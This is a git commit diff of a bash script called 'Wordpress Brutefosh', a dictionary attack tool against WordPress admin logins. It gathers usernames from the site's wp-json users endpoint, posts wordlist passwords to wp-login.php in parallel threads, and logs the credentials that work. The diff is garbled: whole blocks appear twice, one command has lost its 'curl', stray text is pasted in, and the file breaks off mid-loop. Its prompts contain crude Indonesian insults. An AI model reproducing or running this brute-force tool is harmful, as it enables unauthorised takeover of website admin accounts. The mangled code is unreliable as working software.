cd3c8ef29e74a3db6d327885ae8796a73f7006d3
wahyuhaxor <147901804+wahyuhaxor@users.noreply.github.com>
2023-10-15 10:24:26 +0700

    Wpbf.sh

--- wp.sh
+++ wp.sh
@@ -1,6 +1,51 @@
 #!/bin/bash
 # Name       : Wordpress Brutefosh
 # Version    : 1.2
+# Desc.      : Dictionary Attack Tool - Wordpress Admin
+# Coded by   : Schopath
+# Website    : www.zerobyte.id
+# Updated on : 2019-03-28
+
+#----------- CONFIGURATION -----------
+curl_timeout=20
+multithread_limit=10
+#--------- CONFIGURATION EOF ---------
+
+if [[ -f wpusername.tmp ]]
+then
+	rm wpusername.tmp
+fi
+RED='\e[31m'
+GRN='\e[32m'
+YEL='\e[33m'
+CLR='\e[0m'
+
+function _GetUserWPJSON() {
+	Target="${1}";
+	UsernameLists=$(curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s "${Target}/wp-json/wp/v2/users" | grep -Po '"slug":"\K.*?(?=")');
+	echo ""
+	if [[ -z ${UsernameLists} ]];
+	then
+		echo -e "${YEL}INFO: Cannot detect Username!${CLR}"
+	else
+		echo -ne > wpusername.tmp
+		for Username in ${UsernameLists};
+		do
+			echo "INFO: Found username \"${Username}\"..."
+			echo "${Username}" >> wpusername.tmp
+		done
+	fi
+}
+
+function _TestLogin() {
+	Target="${1}"
+#!/bin/bash
+# Name       : Wordpress Brutefosh
+# Version    : 1.2
+# Desc.      : Dictionary Attack Tool - Wordpress Admin
+# Coded by   : Schopath
+# Website    : www.zerobyte.id
+# Updated on : 2019-03-28
 
 #----------- CONFIGURATION -----------
 curl_timeout=20
@@ -49,19 +94,17 @@ function _TestLogin() {
 		echo -e "${YEL}INFO: Invalid ${Target} ${Username}:${Password}${CLR}"
 	fi
 }
-echo '                                     
-echo '▒█░░▒█ █▀▀█ █░░█ █░░█ █░░█ 
-echo '▒█▒█▒█ █▄▄█ █▀▀█ █▄▄█ █░░█ 
+echo '▒█░░▒█ █▀▀█ █░░█ █░░█ █░░█ '
+echo '▒█▒█▒█ █▄▄█ █▀▀█ █▄▄█ █░░█ '
 echo '▒█▄▀▄█ ▀░░▀ ▀░░▀ ▄▄▄█ ░▀▀▀ 
-
-echo '▒█░▒█ █▀▀█ █░█ █▀▀█ █▀▀█ 
-echo '▒█▀▀█ █▄▄█ ▄▀▄ █░░█ █▄▄▀ 
-echo '▒█░▒█ ▀░░▀ ▀░▀ ▀▀▀▀ ▀░▀▀
+'
+echo '▒█░▒█ █▀▀█ █░█ █▀▀█ █▀▀█ '
+echo '▒█▀▀█ █▄▄█ ▄▀▄ █░░█ █▄▄▀  '
+echo '▒█░▒█ ▀░░▀ ▀░▀ ▀▀▀▀ ▀░▀▀ '
 echo '          WORDPRESS BRUTE FORCE           '
 echo '     WAHYU HAXOR | KARAWANG CYBER TEAM     '
 echo ''
-
-echo -ne "[?] Input website target : "
+echo -ne "[?] target web lu njing : "
 read Target
 
 curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s "${Target}/wp-login.php" > wplogin.tmp
@@ -71,12 +114,12 @@ then
 	exit
 fi
 
-echo -ne "[?] Input password lists in (file) : "
+echo -ne "[?] wordlist lu tod (file) : "
 read PasswordLists
 
 if [[ ! -f ${PasswordLists} ]]
 then
-	echo -e "${RED}ERROR: Wordlists not found!${CLR}"
+	echo -e "${RED}ERROR: Wordlist lu gak ada bangsat!${CLR}"
 	exit
 fi
 
@@ -96,8 +139,8 @@ then
 		)
 	done
 else
-	echo -e "${YEL}INFO: Cannot find username${CLR}"
-	echo -ne "[?] Input username manually : "
+	echo -e "${YEL}INFO: Username Tidak Ditemukan:)${CLR}"
+	echo -ne "[?] Masukin Username Manual Tod : "
 	read User
 
 	if [[ -z ${PasswordLists} ]]
@@ -115,4 +158,54 @@ else
 		wait
 	)
 fi
-echo "INFO: Found $(cat wpbf-results.txt | grep ${Target} | sort -nr | uniq | wc -l) username & password in ./wpbf-results.txt
+echo "INFO: Found $(cat wpbf-results.txt | grep ${Target} | sort -nr | uniq | wc -l) username & password in ./wpbf-results.txt"￼Enter	Username="${2}"
+	Password="${3}"
+	LetsTry=$(curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s -w "\nHTTP_STATUS_CODE_X %{http_code}\n" "${Target}/wp-login.php" --data "log=${Username}&pwd=${Password}&wp-submit=Log+In" --compressed)
+	if [[ ! -z $(echo ${LetsTry} | grep login_error | grep div) ]];
+	then
+		echo -e "${YEL}INFO: Invalid ${Target} ${Username}:${Password}${CLR}"
+	elif [[ $(echo ${LetsTry} | grep "HTTP_STATUS_CODE_X" | awk '{print $2}') == "302" ]];
+	then
+		echo -e "${GRN}[!] FOUND ${Target} \e[30;48;5;82m ${Username}:${Password} ${CLR}"
+		echo "${Target} [${Username}:${Password}]" >> wpbf-results.txt
+	else
+		echo -e "${YEL}INFO: Invalid ${Target} ${Username}:${Password}${CLR}"
+	fi
+}
+echo '▒█░░▒█ █▀▀█ █░░█ █░░█ █░░█ '
+echo '▒█▒█▒█ █▄▄█ █▀▀█ █▄▄█ █░░█ '
+echo '▒█▄▀▄█ ▀░░▀ ▀░░▀ ▄▄▄█ ░▀▀▀ 
+'
+echo '▒█░▒█ █▀▀█ █░█ █▀▀█ █▀▀█ '
+echo '▒█▀▀█ █▄▄█ ▄▀▄ █░░█ █▄▄▀  '
+echo '▒█░▒█ ▀░░▀ ▀░▀ ▀▀▀▀ ▀░▀▀ '
+echo '          WORDPRESS BRUTE FORCE           '
+echo '     WAHYU HAXOR | KARAWANG CYBER TEAM     '
+echo ''
+echo -ne "[?] target web lu njing : "
+read Target
+--connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s "${Target}/wp-login.php" > wplogin.tmp
+if [[ -z $(cat wplogin.tmp | grep "wp-submit") ]];
+then
+	echo -e "${RED}ERROR: Invalid wordpress wp-login!${CLR}"
+	exit
+fi
+
+echo -ne "[?] wordlist lu tod (file) : "
+read PasswordLists
+
+if [[ ! -f ${PasswordLists} ]]
+then
+	echo -e "${RED}ERROR: Wordlist lu gak ada bangsat!${CLR}"
+	exit
+fi
+
+_GetUserWPJSON ${Target}
+
+if [[ -f wpusername.tmp ]]
+then
+	for User in $(cat wpusername.tmp)
+	do
+		(
+			for Pass in $(cat ${PasswordLists})
+			do
